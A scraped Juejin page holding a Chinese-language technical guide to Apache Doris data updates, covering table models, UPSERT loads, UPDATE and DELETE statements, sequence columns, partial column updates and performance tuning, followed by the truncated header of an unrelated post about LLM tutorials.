  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T08:30:31.000Z" title="Thu Dec 04 2025 08:30:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读14分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>在数据驱动决策的今天，数据的“新鲜度”已成为企业在激烈市场竞争中脱颖而出的核心竞争力。传统的 T+1 数据处理模式，由于其固有的延迟，已无法满足现代商业对实时性的苛刻要求。无论是为了实现毫秒级的业务库与数据仓库同步、动态调整运营策略，还是为了在秒级内修正错误数据以保障决策的准确性，强大的实时数据更新能力都显得至关重要。</p>
<p><strong><a href="https://link.juejin.cn?target=http%3A%2F%2Fdoris.apache.org" target="_blank" title="http://doris.apache.org" ref="nofollow noopener noreferrer">Apache Doris</a>作为一个现代化的实时分析型数据库，其设计的核心目标之一便是提供极致的数据新鲜度</strong>。它通过强大的数据模型和灵活的更新机制，将数据分析的延迟从天级、小时级成功压缩至秒级，为用户构建实时、敏捷的商业决策闭环提供了坚实的基础。</p>
<p>本文档将作为一份官方指南，系统性地阐述 Apache Doris 的数据更新能力，内容涵盖其核心原理、多样的更新与删除方式、典型的应用场景，以及在不同部署模式下的性能最佳实践，旨在帮助您全面掌握并高效利用 Doris 的数据更新功能。</p>
<h2 data-id="heading-0">1. 核心概念：表模型与更新机制</h2>
<p>在 Doris 中，数据表的表模型（Data Model）决定了其数据组织方式和更新行为。为了支持不同的业务场景，Doris 提供了三种表模型：主键模型（Unique Key）、聚合模型（Aggregate Key）和明细模型（Duplicate Key）。其中，<strong>主键模型是实现复杂、高频数据更新的核心</strong>。</p>
<h3 data-id="heading-1">1.1. 表模型概览</h3>
<p><img src="https://cdn.selectdb.com/static/1_1_fcae8fc6bb.PNG" alt="1.1. 表模型概览.PNG" loading="lazy"/></p>
<h3 data-id="heading-2">1.2. 数据更新方式</h3>
<p>Doris 提供了两大类数据更新方法：<strong>通过数据导入进行更新</strong>和<strong>通过 DML 语句进行更新</strong>。</p>
<h4 data-id="heading-3">1.2.1. 通过导入进行更新 （UPSERT）</h4>
<p>这是 Doris <strong>推荐的高性能、高并发</strong>的更新方式，主要针对<strong>主键模型</strong>。所有的导入方式（Stream Load， Broker Load， Routine Load， <code>INSERT INTO</code>）都天然支持 <code>UPSERT</code> 语义。当新数据导入时，如果其主键已存在，Doris 会用新行数据覆盖旧行数据；如果主键不存在，则插入新行。</p>
<p><img src="https://cdn.selectdb.com/static/1_2_1_UPSERT_15549f380a.PNG" alt="1.2.1. 通过导入进行更新 （UPSERT）.PNG" loading="lazy"/></p>
<h4 data-id="heading-4">1.2.2. 通过 <code>UPDATE</code> DML 语句更新</h4>
<p>Doris 支持标准的 SQL <code>UPDATE</code> 语句，允许用户根据 <code>WHERE</code> 子句指定的条件对数据进行更新。这种方式非常灵活，支持复杂的更新逻辑，例如跨表关联更新。</p>
<p><img src="https://cdn.selectdb.com/static/1_2_2_UPDATE_DML_bbb10203b8.PNG" alt="1.2.2. 通过 UPDATE DML 语句更新.PNG" loading="lazy"/></p>
<pre><code class="hljs language-Plain" lang="Plain">-- 简单更新
UPDATE user_profiles SET age = age + 1 WHERE user_id = 1;

-- 跨表关联更新
UPDATE sales_records t1
SET t1.user_name = t2.name
FROM user_profiles t2
WHERE t1.user_id = t2.user_id;
</code></pre>
<p><strong>注意</strong>：<code>UPDATE</code> 语句的执行过程是先扫描满足条件的数据，然后将更新后的数据重新写回表中。它适合低频、批量的更新任务。<strong>不建议对 <code>UPDATE</code> 语句进行高并发操作</strong>，因为并发的 <code>UPDATE</code> 在涉及相同主键时，无法保证数据的隔离性。</p>
<h4 data-id="heading-5">1.2.3. 通过 <code>INSERT INTO SELECT</code> DML 语句更新</h4>
<p>由于 Doris 默认提供了 UPSERT 的语义，因此使用<code>INSERT INTO SELECT</code>也可以实现类似于<code>UPDATE</code>的更新效果。</p>
<h3 data-id="heading-6">1.3. 数据删除方式</h3>
<p>与更新类似，Doris 也支持通过导入和 DML 语句两种方式删除数据。</p>
<h4 data-id="heading-7">1.3.1. 通过导入进行标记删除</h4>
<p>这是一种高效的批量删除方法，主要用于<strong>主键模型</strong>。用户可以在导入数据时，增加一个特殊的隐藏列 <code>DORIS_DELETE_SIGN</code>。当某行的该列值为 <code>1</code> 或 <code>true</code> 时，Doris 会将该主键对应的数据行标记为删除（关于 delete sign 的原理，后文会有详细的介绍）。</p>
<pre><code class="hljs language-Plain" lang="Plain">// Stream Load 导入数据，删除 user_id 为 2 的行
// curl --location-trusted -u user:passwd -H "columns:user_id, __DORIS_DELETE_SIGN__" -T delete.json http://fe_host:8030/api/db_name/table_name/_stream_load

// delete.json 内容
[
    {"user_id": 2, "__DORIS_DELETE_SIGN__": "1"}
]
</code></pre>
<h4 data-id="heading-8">1.3.2. 通过 <code>DELETE</code> DML 语句删除</h4>
<p>Doris 支持标准的 SQL <code>DELETE</code> 语句，可以根据 <code>WHERE</code> 条件删除数据。</p>
<ul>
<li><strong>主键模型</strong>：<code>DELETE</code> 语句会将满足条件的行的主键重新写入，并附带删除标记。因此，其性能与需要删除的数据量成正比。主键模型上的<code>DELETE</code>语句执行原理与<code>UPDATE</code>语句非常相似，先通过查询把要删除的数据读取出来，然后再附加删除标记进行一次写入。相比<code>UPDATE</code>语句，<code>DELETE</code> 语句只需要写入 Key 列和删除标记列，相对轻量一些。</li>
<li><strong>明细/聚合模型</strong>：<code>DELETE</code> 语句的实现方式是记录一个删除谓词（Delete Predicate）。在查询时，这个谓词会作为一个运行时过滤器（Runtime Filter）来过滤掉被删除的数据。因此，<code>DELETE</code> 操作本身非常快，几乎与删除的数据量无关。但需要注意，<strong>在明细/聚合模型上进行高频的 <code>DELETE</code> 操作会累积大量的运行时过滤器，严重影响后续的查询性能</strong>。</li>
</ul>
<pre><code class="hljs language-Plain" lang="Plain">DELETE FROM user_profiles WHERE last_login &lt; '2022-01-01';
</code></pre>
<p>下表是对使用 DML 语句进行删除的一个简要总结：</p>
<p><img src="https://cdn.selectdb.com/static/1_3_2_DELETE_DML_38909df2a0.png" alt="1.3.2. 通过 DELETE DML 语句删除.png" loading="lazy"/></p>
<h2 data-id="heading-9">2. 深入主键模型：原理与实现</h2>
<p>主键模型是 Doris 实现高性能实时更新的基石。理解其内部工作原理，对于充分发挥其性能至关重要。</p>
<h3 data-id="heading-10">2.1. Merge-on-Write (MoW) vs. Merge-on-Read (MoR)</h3>
<p>主键模型有两种数据合并策略：写时合并（MoW）和读时合并（MoR）。<strong>自 Doris 2.1 版本起，MoW 已成为默认且推荐的实现方式</strong>。</p>
<p><img src="https://cdn.selectdb.com/static/2_1_Merge_on_Write_Mo_W_vs_Merge_on_Read_Mo_R_a7e473d282.png" alt="2.1. Merge-on-Write (MoW) vs. Merge-on-Read (MoR).png" loading="lazy"/></p>
<p><strong>MoW 机制通过在写入阶段付出少量代价，换取了查询性能的巨大提升，完美契合了 OLAP 系统“重读轻写”的特点</strong>。</p>
<p>下图简要的介绍了 MoW 的核心机制：</p>
<p><img src="https://cdn.selectdb.com/static/2_1_Merge_on_Write_Mo_W_vs_Merge_on_Read_Mo_R_1_e10b488f10.png" alt="2.1. Merge-on-Write (MoW) vs. Merge-on-Read (MoR)-1.png" loading="lazy"/></p>
<h3 data-id="heading-11">2.2. 条件更新 （Sequence Column）</h3>
<p>在分布式系统中，数据乱序到达是一个常见问题。例如，一个订单状态先后变更为“已支付”和“已发货”，但由于网络延迟，代表“已发货”的数据可能先于“已支付”的数据到达 Doris。</p>
<p>为了解决这个问题，Doris 引入了 <strong>Sequence 列</strong>机制。用户可以在建表时指定一个列（通常是时间戳或版本号）作为 Sequence 列。当处理具有相同主键的数据时，Doris 会比较它们的 Sequence 列的值，并<strong>始终保留 Sequence 值最大的那一行数据</strong>，从而保证了数据的最终一致性，即使数据乱序到达。</p>
<pre><code class="hljs language-Plain" lang="Plain">CREATE TABLE order_status (
    order_id BIGINT,
    status_name STRING,
    update_time DATETIME
)
UNIQUE KEY(order_id)
DISTRIBUTED BY HASH(order_id)
PROPERTIES (
    "function_column.sequence_col" = "update_time" -- 指定 update_time 为 Sequence 列
);

-- 1. 写入 "已发货" 记录 (update_time 较大)
-- {"order_id": 1001, "status_name": "Shipped", "update_time": "2023-10-26 12:00:00"}

-- 2. 写入 "已支付" 记录 (update_time 较小，后到达)
-- {"order_id": 1001, "status_name": "Paid", "update_time": "2023-10-26 11:00:00"}

-- 最终查询结果，保留了 update_time 最大的记录
-- order_id: 1001, status_name: "Shipped", update_time: "2023-10-26 12:00:00"
</code></pre>
<h3 data-id="heading-12">2.3. 删除机制 DORIS_DELETE_SIGN</h3>
<p><code>DORIS_DELETE_SIGN</code> 的工作原理可以概括为“逻辑标记，后台清理”。</p>
<ol>
<li><strong>执行删除</strong>：当用户通过导入或<code>DELETE</code>语句删除数据时，Doris 不会立即从物理文件中移除数据。相反，它会为要删除的主键写入一条新记录，该记录的 <code>DORIS_DELETE_SIGN</code> 列被标记为 <code>1</code>。</li>
<li><strong>查询过滤</strong>：当用户查询数据时，Doris 会在查询计划中自动添加一个过滤条件 <code>WHERE DORIS_DELETE_SIGN = 0</code>，从而在查询结果中隐藏所有被标记为删除的数据。</li>
<li><strong>后台 Compaction</strong>：Doris 的后台 Compaction 进程会定期扫描数据。当它发现一个主键同时存在正常记录和删除标记记录时，它会在合并过程中将这两条记录都物理地移除，最终释放存储空间。</li>
</ol>
<p>这种机制确保了删除操作的快速响应，同时通过后台任务异步完成物理清理，避免了对在线业务的性能冲击。</p>
<p>下图展示了<code>DORIS_DELETE_SIGN</code> 的工作原理：</p>
<p><img src="https://cdn.selectdb.com/static/2_3_DORIS_DELETE_SIGN_abff2b5b2b.png" alt="2.3. 删除机制 （DORIS_DELETE_SIGN） .png" loading="lazy"/></p>
<h3 data-id="heading-13">2.4 部分列更新（Partial Column Update）</h3>
<p>从 2.0 版本开始，Doris 在主键模型（MoW）上支持了强大的部分列更新能力。用户在导入数据时，只需提供主键和待更新的列，未提供的列将保持其原值不变。这极大地简化了宽表拼接、实时标签更新等场景的 ETL 流程。</p>
<p>要启用此功能，需在创建主键模型表时，开启 Merge-on-Write （MoW） 模式，并设置 <code>enable_unique_key_partial_update</code> 属性为 <code>true</code>。或者在数据导入时配置<code>"partial_columns"</code>参数</p>
<pre><code class="hljs language-Plain" lang="Plain">CREATE TABLE user_profiles (
    user_id BIGINT,
    name STRING,
    age INT,
    last_login DATETIME
)
UNIQUE KEY(user_id)
DISTRIBUTED BY HASH(user_id)
PROPERTIES (
    "enable_unique_key_partial_update" = "true"
);

-- 初始数据
-- user_id: 1, name: 'Alice', age: 30, last_login: '2023-10-01 10:00:00'

-- 通过 Stream Load 导入部分更新数据，只更新 age 和 last_login
-- {"user_id": 1, "age": 31, "last_login": "2023-10-26 18:00:00"}

-- 更新后数据
-- user_id: 1, name: 'Alice', age: 31, last_login: '2023-10-26 18:00:00'
</code></pre>
<p><strong>部分列更新原理概要</strong></p>
<p>不同于传统的 OLTP 数据库，Doris 的部分列更新并非是原地的数据更新，为了让 Doris 有更好的写入吞吐以及查询性能，主键模型的部分列更新采取了“<strong>导入时将缺失字段补齐后再整行写入</strong>”的实现方案。如下图所示：</p>
<p><img src="https://cdn.selectdb.com/static/2_4_Partial_Column_Update_8b44c2091e.png" alt="2.4 部分列更新（Partial Column Update）.png" loading="lazy"/></p>
<p>因此使用 Doris 的部分列更新存在“<strong>读放大</strong>”和“<strong>写放大</strong>”的影响。例如给一个 100 列的宽表更新 10 个字段，Doris 在写入过程中需要补齐缺失的 90 个字段，假设每个字段的大小接近，则 1MB 的 10 字段更新，会在 Doris 系统中产生大约 9MB 的数据读取（补齐缺失的字段），以及 10MB 的数据写入（补齐整行后写入到新的文件），也就是有大约 9 倍的读放大和 10 倍的写放大。</p>
<p><strong>部分列更新性能建议</strong></p>
<p>由于部分列更新存在读放大和写放大，同时 Doris 还是列存系统，在数据读取的过程中可能会产生大量随机 IO，因此对硬盘的随机读 IOPS 有较高的要求。由于传统的机械磁盘在随机 IO 上存在显著瓶颈，因此如果要使用部分列更新功能进行高频的写入，<strong>建议使用 SSD 硬盘，最好是 nvme 接口</strong>，能够提供最好的随机 IO 支撑。</p>
<p>同时，<strong>如果表很宽，也建议开启行存来减少随机 IO</strong>。开启行存后，Doris 会在列存之外额外的存储一份行存数据，由于行存数据每一行都是连续存储的，因此可以一次 IO 就读取到整行数据（列存则需要 N 次 IO 才能读取到所有缺失的字段，例如前面的 100 列宽表更新 10 列的例子，每一行需要 90 次 IO 才能读取到所有的字段）</p>
<h2 data-id="heading-14">3. 典型应用场景</h2>
<p>Doris 强大的数据更新能力使其能够胜任多种要求严苛的实时分析场景。</p>
<h3 data-id="heading-15">3.1. CDC 数据实时同步</h3>
<p>通过 Flink CDC 等工具捕获上游业务数据库（如 MySQL， PostgreSQL， Oracle）的变更数据（Binlog），并实时写入 Doris 的主键模型表，是构建实时数仓最经典的场景。</p>
<ul>
<li><strong>整库同步</strong>：Flink Doris Connector 内部集成了 Flink CDC，可以实现从上游数据库到 Doris 的自动化、端到端的整库同步，无需手动建表和配置字段映射。</li>
<li><strong>保证一致性</strong>：利用主键模型的 <code>UPSERT</code> 能力处理上游的 <code>INSERT</code> 和 <code>UPDATE</code> 操作，利用 <code>DORIS_DELETE_SIGN</code> 处理 <code>DELETE</code> 操作，并结合 Sequence 列（如 Binlog 中的时间戳）处理乱序数据，完美复刻上游数据库的状态，实现毫秒级延迟的数据同步。</li>
</ul>
<p><img src="https://cdn.selectdb.com/static/3_1_CDC_4373a3ec4f.png" alt="3.1. CDC 数据实时同步.png" loading="lazy"/></p>
<h3 data-id="heading-16">3.2. 实时宽表拼接</h3>
<p>在很多分析场景中，需要将来自不同业务系统的数据拼接成一张用户宽表或商品宽表。传统的方式是使用离线的 ETL 任务（如 Spark 或 Hive）定期（T+1）进行拼接，实时性差，且维护成本高。或者使用 Flink 进行实时的宽表 join 计算，将拼接后的数据写入数据库，这通常需要消耗大量的计算资源。</p>
<p>利用 Doris 的<strong>部分列更新</strong>能力，可以极大地简化这一流程：</p>
<ol>
<li>在 Doris 中创建一张主键模型的宽表。</li>
<li>将来自不同数据源（如用户基础信息、用户行为数据、交易数据等）的数据流通过 Stream Load 或 Routine Load 实时写入这张宽表。</li>
<li>每个数据流只负责更新自己相关的字段。例如，用户行为数据流只更新 <code>page_view_count</code>， <code>last_login_time</code> 等字段；交易数据流只更新 <code>total_orders</code>， <code>total_amount</code> 等字段。</li>
</ol>
<p>这种方式不仅将宽表的构建从离线 ETL 转变为实时流式处理，大大提升了数据新鲜度，还因为只写入变化的列而减少了 I/O 开销，提升了写入性能。</p>
<p><img src="https://cdn.selectdb.com/static/3_2_a7a70463f6.png" alt="3.2. 实时宽表拼接.png" loading="lazy"/></p>
<h2 data-id="heading-17">4. 最佳实践</h2>
<p>遵循以下最佳实践，可以帮助您更稳定、更高效地使用 Doris 的数据更新功能。</p>
<h3 data-id="heading-18">4.1. 通用性能实践</h3>
<ol>
<li><strong>优先使用导入更新</strong>：对于高频、大量的更新操作，应优先选择 Stream Load， Routine Load 等导入方式，而非 <code>UPDATE</code> DML 语句。</li>
<li><strong>攒批写入</strong>：避免使用 <code>INSERT INTO</code> 语句进行逐条的高频写入（如 &gt; 100 TPS），因为每条 <code>INSERT</code> 都会产生一次事务开销。如果必须使用，应考虑开启 Group Commit 功能，将多个小批量提交合并成一个大事务。</li>
<li><strong>谨慎使用高频 DELETE</strong>：在明细模型和聚合模型上，避免高频的 <code>DELETE</code> 操作，以防查询性能下降。</li>
<li><strong>删除分区数据时使用 TRUNCATE PARTITION</strong>：如果需要删除整个分区的数据，应使用 <code>TRUNCATE PARTITION</code>，其效率远高于 <code>DELETE</code>。</li>
<li><strong>串行执行 UPDATE</strong>：避免并发执行可能作用于相同数据行的 <code>UPDATE</code> 任务。</li>
</ol>
<h3 data-id="heading-19">4.2. 存算分离架构下的主键模型实践</h3>
<p>Doris 3.0 引入了先进的存算分离架构，带来了极致的弹性和更低的成本。在该架构下，由于 BE 无状态，因此在 Merge-on-Write 过程中，需要通过 MetaService 来维护一个全局状态以解决导入/compaction/schema change 之间的写写冲突。主键模型的 MoW 实现依赖于一个基于 Meta Service 的分布式表锁来保证写操作的一致性，如下图所示：</p>
<p><img src="https://cdn.selectdb.com/static/4_2_7750672837.png" alt="4.2. 存算分离架构下的主键模型实践.png" loading="lazy"/></p>
<p>高频的导入和 Compaction 会导致对表锁的频繁竞争，因此需要特别注意以下几点：</p>
<ol>
<li><strong>控制单表导入频率</strong>：建议将单张主键表的导入频率控制在 <strong>60 次/秒</strong> 以内。可以通过攒批、调整导入并发等方式来降低频率。</li>
<li><strong>合理设计分区分桶</strong>：
<ol>
<li><strong>分区</strong>：利用时间分区（如按天或按小时）可以确保单次导入只更新少量分区，减少锁竞争的范围。</li>
<li><strong>分桶</strong>：分桶数（Tablet 数量）应根据数据量合理设置，通常在 8-64 之间。过多的 Tablet 会加剧锁竞争。</li>
</ol>
</li>
<li><strong>调整 Compaction 策略</strong>：在写入压力非常大的场景下，可以适当调整 Compaction 策略，降低 Compaction 的频率，从而减少其与导入任务之间的锁冲突。</li>
<li><strong>升级到最新稳定版本</strong>：Doris 社区正在持续优化存算分离架构下的主键模型性能。例如，即将发布的 3.1 版本对分布式表锁的实现进行了大幅优化。<strong>始终建议使用最新的稳定版本</strong>以获得最佳性能。</li>
</ol>
<h2 data-id="heading-20">结论</h2>
<p>Apache Doris 凭借其以主键模型为核心的强大、灵活且高效的数据更新能力，真正打破了传统 OLAP 系统在数据新鲜度上的瓶颈。无论是通过高性能的导入实现 <code>UPSERT</code> 和部分列更新，还是利用 Sequence 列保证乱序数据的一致性，Doris 都为构建端到端的实时分析应用提供了完整的解决方案。</p>
<p>通过深入理解其核心原理，掌握不同更新方式的适用场景，并遵循本文档提供的最佳实践，您将能够充分释放 Doris 的潜力，让实时数据真正成为驱动业务增长的强大引擎。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[刚入门AI大模型？这6个GitHub开源教程，连微软都忍不住推荐]]></title>    <link>https://juejin.cn/post/7579629985063190554</link>    <guid>https://juejin.cn/post/7579629985063190554</guid>    <pubDate>2025-12-04T08:36:58.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579629985063190554" data-draft-id="7579629985062764570" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="刚入门AI大模型？这6个GitHub开源教程，连微软都忍不住推荐"/> <meta itemprop="keywords" content="LLM,Agent,程序员"/> <meta itemprop="datePublished" content="2025-12-04T08:36:58.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="AI大模型"/> <meta itemprop="url" content="https://juejin.cn/user/3817967696221534"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            刚入门AI大模型？这6个GitHub开源教程，连微软都忍不住推荐
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3817967696221534/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    AI大模型
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T08:36:58.000Z" title="Thu Dec 04 2025 08:36:58 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#383838;font-size:15px;line-height:30px;letter-spacing:2px;word-break:break-word;font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Oxygen,Ubuntu,Cantarell,Open Sans,Helvetica Neue,sans-serif;scroll-behavior:smooth;background-image:linear-gradient(0deg,transparent 24%,rgba(201,195,195,.329) 25%,hsla(0,8%,80.4%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent),linear-gradient(90deg,transparent 24%,rgba(204,196,196,.226) 25%,hsla(0,4%,66.1%,.05) 26%,transparent 27%,transparent 74%,hsla(0,5.2%,81%,.185) 75%,rgba(180,176,176,.05) 76%,transparent 77%,transparent);background-color:#fff;background-size:50px 50px;padding-bottom:60px}.markdown-body ::selection{color:#fff;background-color:#a862ea}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{margin:24px 0 12px;color:#a862ea}.markdown-body h1{line-height:2;font-size:1.4em}.markdown-body h1~p:first-of-type:first-letter{color:#a862ea;float:left;font-size:2em;margin-right:.4em;font-weight:bolder}.markdown-body h2{font-size:1.2em}.markdown-body h3{font-size:1.1em}.markdown-body ol,.markdown-body ul{padding-left:2em}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;padding-left:.2em}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#a862ea}.markdown-body ol li.task-list-item,.markdown-body ul li.task-list-item{list-style:none}.markdown-body ol li.task-list-item ol,.markdown-body ol li.task-list-item ul,.markdown-body ul li.task-list-item ol,.markdown-body ul li.task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:10px}.markdown-body a,.markdown-body code,.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6,.markdown-body li,.markdown-body p{opacity:.85;vertical-align:baseline;transition:all .1s ease}.markdown-body a:hover,.markdown-body code:hover,.markdown-body h1:hover,.markdown-body h2:hover,.markdown-body h3:hover,.markdown-body h4:hover,.markdown-body h5:hover,.markdown-body h6:hover,.markdown-body li:hover,.markdown-body p:hover{opacity:1}.markdown-body a{display:inline-block;color:#a862ea;cursor:pointer;text-decoration:none;position:relative}.markdown-body a:after{content:"";position:absolute;width:98%;height:1px;bottom:0;left:0;transform:scaleX(0);background-color:#a862ea;transform-origin:bottom right;transition:transform .3s ease-in-out}.markdown-body a:hover:after{transform:scaleX(1);transform-origin:bottom left}.markdown-body a:active,.markdown-body a:link{color:#a862ea}.markdown-body img{max-width:100%;user-select:none;margin:1em 0;transition:transform .2s ease 0s;background-color:#f8f5ff;box-shadow:0 0 10px #e7daff}.markdown-body img:hover{opacity:1;box-shadow:0 0 20px #e7daff;transform:translateY(-1px)}.markdown-body blockquote{padding:.5em 1em;margin:12px 0;border-top-left-radius:2px;border-bottom-left-radius:2px;border-left:3px solid #a862ea;background-color:#f8f5ff}.markdown-body 